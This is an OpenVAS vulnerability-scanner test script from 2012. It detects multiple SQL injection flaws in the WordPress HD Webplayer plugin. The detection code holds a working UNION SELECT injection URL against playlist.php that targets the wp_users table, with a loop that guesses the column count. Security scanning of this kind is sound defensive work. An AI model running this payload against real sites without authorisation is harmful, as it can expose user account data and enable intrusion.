###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_hd_webplayer_plugin_mult_sql_inj_vuln.nasl 11435 2018-09-17 13:44:25Z cfischer $
#
# WordPress HD Webplayer Plugin Multiple SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903039");
  script_version("$Revision: 11435 $");
  script_bugtraq_id(55259);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-04-11 11:02:04 +0200 (Di, 11 Apr 2017)$");
  script_tag(name:"creation_date", value:"2012-08-31 11:50:18 +0530 (Fri, 31 Aug 2012)");
  script_name("WordPress HD Webplayer Plugin Multiple SQL Injection Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://secunia.com/advisories/50466/");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/78119");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/20918/");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/50466");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/116011/wphdwebplayer-sql.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to manipulate
  SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"Wordpress HD Webplayer version 1.1");

  script_tag(name:"insight", value:"The input passed via the 'id' parameter to
  wp-content/plugins/webplayer/config.php and the 'videoid' parameter to
  wp-content/plugins/webplayer/playlist.php is not properly sanitised before
  being used in a SQL query.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running WordPress with HD Webplayer and is prone to
  multiple SQL injection vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

foreach player(make_list("webplayer", "hd-webplayer")){

  url = dir + '/wp-content/plugins/' + player + '/playlist.php?videoid=1+/*!UNION*/+/*!SELECT*/+group_concat(ID,0x3a,0x53514c692d54657374,0x3a,0x53514c692d54657374,0x3b),2,3,4';

  # The Number of columns may be different. Considering columns till 15
  for(i = 5; i <= 15; i++){

    url = url + ',' + i;
    exploit = url + '+from+wp_users';

    if(http_vuln_check(port:port, url:exploit, pattern:">[0-9]+:SQLi-Test:SQLi-Test", check_header:TRUE, extra_check:make_list("<playlist>", "hdwebplayer.com"))){
      report = report_vuln_url(port:port, url:exploit);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);